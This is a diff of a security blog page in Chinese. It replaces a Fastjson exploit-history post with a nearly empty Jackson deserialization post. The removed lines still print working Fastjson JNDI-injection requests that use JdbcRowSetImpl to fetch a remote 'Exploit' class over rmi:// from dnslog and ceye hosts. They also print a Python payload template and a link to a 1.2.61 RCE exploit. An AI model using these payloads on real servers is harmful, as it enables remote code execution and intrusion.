@@ -6,15 +6,13 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="fastjson漏洞历史&amp;poc复现分析, BUPT PWN Web安全 Java安全">
+    <meta name="keywords" content="JavaSec Jackjson反序列化漏洞利用原理, BUPT PWN Web安全 Java安全">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="参考资料
-
-fastjson poc
-
-郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！
-0x01 Fastjson&amp;lt;=1.2.24反序列化远程代码执行">
+    <meta name="description" content="
+        document.querySelectorAll(&#39;.github-emoji&#39;)
+          .forEach(el =&gt; {
+            if (!el.dataset.src) { return">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +20,7 @@ fastjson poc
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>fastjson漏洞历史&amp;poc复现分析 | thonsun&#39;s blog</title>
+    <title>JavaSec Jackjson反序列化漏洞利用原理 | thonsun&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -551,13 +549,13 @@ fastjson poc
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        fastjson漏洞历史&amp;poc复现分析
+                        JavaSec Jackjson反序列化漏洞利用原理
                     </div>
                 </div>
             </div>
@@ -667,29 +665,12 @@ fastjson poc
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/javasec/" target="_blank">
-                                <span class="chip bg-color">javasec</span>
-                            </a>
-                        
-                            <a href="/tags/poc/" target="_blank">
-                                <span class="chip bg-color">poc</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fa fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/vulhub/" class="post-category" target="_blank">
-                                vulhub
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -697,7 +678,7 @@ fastjson poc
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-20
+                    2020-11-02
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -711,14 +692,14 @@ fastjson poc
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        649
+                        52
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        1 分
                     </div>
                     
                 
@@ -735,95 +716,7 @@ fastjson poc
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>参考资料</p>
-<blockquote>
-<p><a href="https://www.ascotbe.com/1899/11/30/Cms/Fastjson/" target="_blank" rel="noopener">fastjson poc</a></p>
-</blockquote>
-<p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
-<h4 id="0x01-Fastjson-lt-1-2-24反序列化远程代码执行漏洞"><a href="#0x01-Fastjson-lt-1-2-24反序列化远程代码执行漏洞" class="headerlink" title="0x01 Fastjson<=1.2.24反序列化远程代码执行漏洞"></a>0x01 Fastjson&lt;=1.2.24反序列化远程代码执行漏洞</h4><ul>
-<li><p>披露时间</p>
-<pre><code>    2017-3-15</code></pre></li>
-<li><p><code>CVE</code>编号</p>
-<pre><code>    无</code></pre></li>
-<li><p>影响版本</p>
-<pre><code>    Fastjson&lt;=1.2.24</code></pre></li>
-<li><p>漏洞分析</p>
-<pre><code>    fastjson在处理以@type形式传入的类的时候，会默认调用该类的共有set\get\is函数</code></pre></li>
-</ul>
-<h5 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式:"></a>请求方式:</h5><pre><code>POST</code></pre><h5 id="POC"><a href="#POC" class="headerlink" title="POC:"></a>POC:</h5><ul>
-<li>直接发送数据包即可</li>
-</ul>
-<pre><code>[![image-20200220165248326](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/1.png?raw=true)**image-20200220165248326**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/1.png)
-
-
-
-```
-  POST / HTTP/1.1
-  Host: you_ip
-  Accept-Encoding: gzip, deflate
-  Accept: */*
-  Accept-Language: en
-  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-  Connection: close
-  Content-Type: application/json
-  Content-Length: 170
-
-  {
-      "b":{
-          "@type":"com.sun.rowset.JdbcRowSetImpl",
-          "dataSourceName":"rmi://222.dob132.dnslog.cn//Exploit",
-          "autoCommit":true
-      }
-  }
-```</code></pre><ul>
-<li>注意<code>rmi://XXXX//Exploit</code>这段到代码只需要替换<code>xxxx</code>的值即可</li>
-</ul>
-<pre><code>[![image-20200220165312932](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/2.png?raw=true)**image-20200220165312932**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/2.png?raw=true)</code></pre><h4 id="0x02-Fastjson-1-2-47-远程命令执行漏洞"><a href="#0x02-Fastjson-1-2-47-远程命令执行漏洞" class="headerlink" title="0x02 Fastjson 1.2.47 远程命令执行漏洞"></a>0x02 Fastjson 1.2.47 远程命令执行漏洞</h4><ul>
-<li><p>披露时间</p>
-<pre><code>    2019-7-15</code></pre></li>
-<li><p><code>CVE</code>编号</p>
-<pre><code>    无</code></pre></li>
-<li><p>影响版本</p>
-<pre><code>    Fastjson&lt;=1.2.47</code></pre></li>
-<li><p>漏洞分析</p>
-<pre><code>    fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。</code></pre></li>
-</ul>
-<h5 id="请求方式-1"><a href="#请求方式-1" class="headerlink" title="请求方式:"></a>请求方式:</h5><pre><code>POST</code></pre><h5 id="POC-1"><a href="#POC-1" class="headerlink" title="POC:"></a>POC:</h5><ul>
-<li>直接发送数据包即可</li>
-</ul>
-<pre><code>[![image-20200220170302444](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/3.png?raw=true)**image-20200220170302444**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/3.png?raw=true)
-
-
-
-```
-  POST / HTTP/1.1
-  Host: you_ip
-  Accept-Encoding: gzip, deflate
-  Accept: */*
-  Accept-Language: en
-  User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-  Connection: close
-  Content-Type: application/json
-  Content-Length: 268
-
-  {
-      "a":{
-          "@type":"java.lang.Class",
-          "val":"com.sun.rowset.JdbcRowSetImpl"
-      },
-      "b":{
-          "@type":"com.sun.rowset.JdbcRowSetImpl",
-          "dataSourceName":"rmi://123.dd.evhyf5.dnslog.cn/Exploit",
-          "autoCommit":true
-      }
-  }
-```</code></pre><ul>
-<li>注意<code>rmi://XXXX//Exploit</code>这段到代码只需要替换<code>xxxx</code>的值即可</li>
-</ul>
-<pre><code>[![image-20200220170351359](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/4.png?raw=true)**image-20200220170351359**](https://github.com/Ascotbe/Random-img/blob/master/CMS/Fastjson/4.png?raw=true)</code></pre><p>Fastjson 1.2.51</p>
-<pre><code> payload = "{\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://%s.xw2kit.ceye.io:1066/Exploit\",\"autoCommit\":true}}}" %(url)</code></pre><p>Fastjson 1.2.61</p>
-<pre><code>https://github.com/jas502n/fastjson-1.2.61-RCE</code></pre><p>Fastjson 1.2.62</p>
-<script>
+                <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
             if (!el.dataset.src) { return; }
@@ -991,7 +884,7 @@ fastjson poc
                     </span>
                     <a href="https://thonsun.github.io" class="b-link-green">thonsun's blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2020/12/20/fastjson-lou-dong-li-yong-li-shi-fu-xian-poc-fen-xi/" class="b-link-green">fastjson漏洞历史&amp;poc复现分析</a>
+                    <a href="/2020/11/02/jackjson-fan-xu-lie-hua-lou-dong-li-yong-yuan-li/" class="b-link-green">JavaSec Jackjson反序列化漏洞利用原理</a>
                 </p>
             </div>
 
@@ -1014,7 +907,7 @@ fastjson poc
         repo: 'thonsun.github.io',
         owner: 'thonsun',
         admin: ["thonsun"],
-        id: '2020/12/20/fastjson-lou-dong-li-yong-li-shi-fu-xian-poc-fen-xi/',
+        id: '2020/11/02/jackjson-fan-xu-lie-hua-lou-dong-li-yong-yuan-li/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1337,13 +1230,13 @@ fastjson poc
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/12/24/java-fan-xu-lie-hua-lou-dong-li-yong-fen-xi/">
+                <a href="/2020/11/10/fastjson-fan-xu-lie-lou-dong-gong-fang-li-shi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="java-反序列化漏洞利用分析">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="JavaSec Fastjson反序列漏洞攻防历史">
                         
-                        <span class="card-title">java-反序列化漏洞利用分析</span>
+                        <span class="card-title">JavaSec Fastjson反序列漏洞攻防历史</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -1357,7 +1250,7 @@ fastjson poc
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-24
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-11-10
                         </span>
                         <span class="publish-author">
                             
@@ -1374,55 +1267,32 @@ fastjson poc
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/12/04/huan-jing-pei-zhi/">
+                <a href="/2020/10/24/jackjson-fan-xu-lie-lou-dong-gong-fang-li-shi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="环境配置">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="JavaSec Jackjson反序列漏洞攻防历史">
                         
-                        <span class="card-title">环境配置</span>
+                        <span class="card-title">JavaSec Jackjson反序列漏洞攻防历史</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-使用电脑浏览效果更佳！
-
-整理常用的win | linux环境，包括开发用环境：Jetbrain全家桶crack过程；
-
-
-Jetbrains全家桶
-关注最新的 refer 【重要】
-
-
-2.以IDEA为例
-2.1 官网下载对应版本 20
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-12-04
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-10-24
                             </span>
                         <span class="publish-author">
                             
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/环境配置/" class="post-category" target="_blank">
-                                    环境配置
-                                </a>
-                            
-                            
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/环境配置/" target="_blank">
-                        <span class="chip bg-color">环境配置</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -1595,7 +1465,7 @@ Jetbrains全家桶
 
             
                 &nbsp; | &nbsp;字数统计:&nbsp;
-                <span class="white-color">23.9k</span> 字
+                <span class="white-color">23.5k</span> 字
             
 
             
